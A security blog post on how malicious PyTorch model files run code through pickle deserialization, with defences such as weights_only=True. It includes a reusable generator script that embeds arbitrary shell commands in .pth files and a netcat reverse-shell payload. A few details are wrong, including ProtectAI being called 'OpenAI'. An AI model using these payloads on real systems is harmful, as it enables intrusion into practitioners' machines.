---
layout: post
title: How to craft Malicious Machine Learning models
date: 2024-12-15
categories: [blog]
tags: [ai]
---

*An insight on how PyTorch malicious ML models work, how to weaponize them and the possible solutions for developers and end users to protect themselves.*

![](/assets/images/htcmmlm_banner.jpeg)

## A brief insight on PyTorch and what could go wrong
PyTorch is a Python library designed for machine learning tasks, offering an intuitive API for loading data, training models, and saving them efficiently.
When PyTorch saves a model, it uses Pickle by default, a Python library that, by serializing and deserializing data, accelerates the process of loading it later, compared to formats like JSON or CSV.

### Serializing and deserializing

Here's a quick demonstration of how Pickle serializes and deserializes objects.

Imagine you're working on a video game. You want to store player data, such as health (HP) and experience points (XP), in a Player object. For debugging purposes, you may need to save this data to a file so you can load and analyze it later.

```python
import pickle

class Player:
    def __init__(self, hp, xp):
        self.hp = hp
        self.xp = xp
    
player1 = Player(200, 50)

with open('player1.pkl', 'wb') as f:
    pickle.dump(player1, f)
```

In the example above, we created a `Player` object with 200 HP and 50 XP. The object was then serialized into a file named `player1.pkl` using Pickle.

Let's now load the player's data.

```python
import pickle

class Player:
    def __init__(self, hp, xp):
        self.hp = hp
        self.xp = xp

with open('player1.pkl', 'rb') as f:
    player1 = pickle.load(pkl)

print(player1.xp)
```

In this example the script deserialized the `Players` object previously saved in `player1.pkl`. It then prints `player1`'s XP.

### So how can serialized data be malicious?
Well, it's not the serialized data itself; rather, it's the way the data is unserialized.
Pickle works on a dedicated virtual machine called the Pickle Machine (PM) and has its own opcodes.
There are a pair of "*exotic opcodes that* (can) *cause trouble*":
- GLOBAL
- REDUCE

The GLOBAL opcode is capable of importing modules or classes, while the REDUCE opcode is capable of calling objects (such as functions), executing them on the actual host.
This means that one can craft a Pickle artifact that uses the GLOBAL opcode to import the *os* module and later calls the `os.exec()` function to execute a command on the device.

## Crafting a malicious PyTorch model
We saw that pickle is used to serialize objects, that PyTorch, by default, uses pickle to save tensor data, and lastly, that there's an opcode capable of executing arbitrary code outside the Pickle Machine. 

Creating a malicious model is surprisingly simple. We just need to define a class with a __reduce__ method. This method is part of Python’s pickling protocol and tells pickle how to serialize and deserialize the object. By returning a callable— such as `os.system` or `subprocess.Popen`— along with its arguments, we can instruct the REDUCE opcode to execute arbitrary code during deserialization.

```python
import torch
import os

class Malcraft:
    def __reduce__(self):
        return os.system, ("echo this is a malicious model!",)

mal = Malcraft()
with open('malcraft.pth', 'wb') as f:
    torch.save(mal, f)
```

In the code sample above, I instantiated a `Malcraft` object and saved it to a pickle file. This time, instead of using `pickle.dump`, I used `torch.save`. This ensures the file includes PyTorch's "*magic number*"— a file header that PyTorch writes to identify files it creates and distinguish them from standard pickles.

> **Protip**: If you're not familiar with PyTorch and want to try the code above, install PyTorch with `pip install torch --index-url https://download.pytorch.org/whl/cpu`. This will skip the GPU optimization modules, so PyTorch will run on your device’s CPU instead.

Let's see what happens when the victim loads the model.

```python
import torch

model = torch.load('malcraft.pth')
```

![](/assets/images/victim.png)

When the malicious model is loaded, it executes the embedded command, echoing "this is a malicious model!" as shown in the screenshot. Interestingly, a `FutureWarning` is printed before the command execution, informing the user that in a future PyTorch release, the default value of `weights_only` will change to `True`. This change will restrict what can be loaded during deserialization, making this type of attack ineffective.

    FutureWarning: You are using torch.load with weights_only=False (the current default value), which uses the default pickle module implicitly. 
    It is possible to construct malicious pickle data which will execute arbitrary code during unpickling (See https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models for more details). 
    In a future release, the default value for weights_only will be flipped to True. This limits the functions that could be executed during unpickling. 
    Arbitrary objects will no longer be allowed to be loaded via this mode unless they are explicitly allowlisted by the user via torch.serialization.add_safe_globals. 
    We recommend you start setting weights_only=True for any use case where you don't have full control of the loaded file. 
    Please open an issue on GitHub for any issues related to this experimental feature.

### Adding spice to Malcraft
Ok, we printed a message as a PoC but what else can we do? Literally everything. We could donwload a malware on the endpoint or get a reverse shell.

```python
import torch
import os
import sys

class Malcraft:
    def __init__(self, cmd):
        self.cmd = cmd 
    def __reduce__(self):
        return os.system, (self.cmd, )

if len(sys.argv) < 2:
    print(f'Usage: {sys.argv[0]} {{PAYLOAD}}')
    sys.exit(0)

mal = Malcraft(sys.argv[1])
with open('malcraft.pth', 'wb') as f:
    torch.save(mal, f)
```

In this snippet, I added a new feature: the possibility to customize the malicious model from CLI.

```sh
python3 malicious_crafter.py 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.59 4444 >/tmp/f'
```

The payload will spawn a reverse shell on the target connecting back to my host listening on port 4444 (`nc -lnvp 4444`).

![](/assets/images/reverse_shell.png)

> I hacked myself and messed up my terminal 😅.

## How to defend yourself
If you’re a machine learning practitioner, you might be asking yourself, “How can I protect myself when downloading countless PyTorch models from Hugging Face?” While I’ll outline some solutions at the end, let’s first dive into some background to set the stage.

For those unfamiliar with [Hugging Face](https://huggingface.co/), it is a popular platform for sharing machine learning models.
Think of it as PyPI, but for ML models. Users and organizations can upload their models, and Hugging Face provides an API that lets you easily download and integrate them into your Python code.
As we've explored throughout this article, it's surprisingly easy to craft a malicious model. An attacker could exploit this by uploading such a model to Hugging Face with a name that mimics a popular model, leveraging typo squatting to trick users into downloading it.

Just recently, ProtectAI, a new company in the AI and Cybersecurity fields, [announced that is now partner of Hugging Face](https://protectai.com/blog/protect-ai-hugging-face-ml-supply-chain?hsCtaTracking=effa6a39-32ad-4b22-9720-825244c74098%7Cfdf67058-fdea-4984-8c7e-721226d12877) to enhance the security of the ML supply chain.
What's even cooler about ProtectAI, is that they are pretty oriented towards resource sharing and open source and among various useful tools leveraging AI, they also share reports on their findings like [InsightDB](https://protectai.com/insights).

Given the security layer added by OpenAI to the Hugging Face pipeline, you should always double check for typos and only download models uploaded by users or companies you trust.

Lastly, as we saw earlier, when you load a model, always set `weights_only` to `True`. For our "malcraft.pth" specific case, the following code will avoid executing the malicious code and will crash because PyTorch can not find any weight.

```python
import torch

model = torch.load('malcraft.pth', weights_only=True)
```

As a result, PyTorch warns that it couldn’t find any weights and suggests setting `weights_only` to `False`— but only if you trust the source. Additionally, PyTorch detected an attempt to load a `GLOBAL` reference to the `posix.system` function during unpickling and prevented the execution of arbitrary code.

    _pickle.UnpicklingError: Weights only load failed. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. 
    Do it only if you got the file from a trusted source.
    Trying to load unsupported GLOBAL posix.system whose module posix is blocked.

## Further reading
If you'd like to dive deeper on the argument, I leave some interesting articles below.

- [How to hack and poison a machine learning pipeline](https://medium.com/@0xffisnotavailable/malicious-ml-models-blurry-htb-writeup-ce829bf5c6ae)— My writeup on Medium about the Blurry CTF, where I explored vulnerabilities in ML pipelines.
- [Never a dill moment exploiting machine learning pickle files](https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/)— This article introduces Fickling, an open-source tool for analyzing pickle files. While I didn’t include it in this article due to its limitations with PyTorch models, it’s worth exploring for general pickle security.
- [OpenAI x Hugging Face](https://protectai.com/blog/protect-ai-hugging-face-ml-supply-chain?hsCtaTracking=effa6a39-32ad-4b22-9720-825244c74098%7Cfdf67058-fdea-4984-8c7e-721226d12877)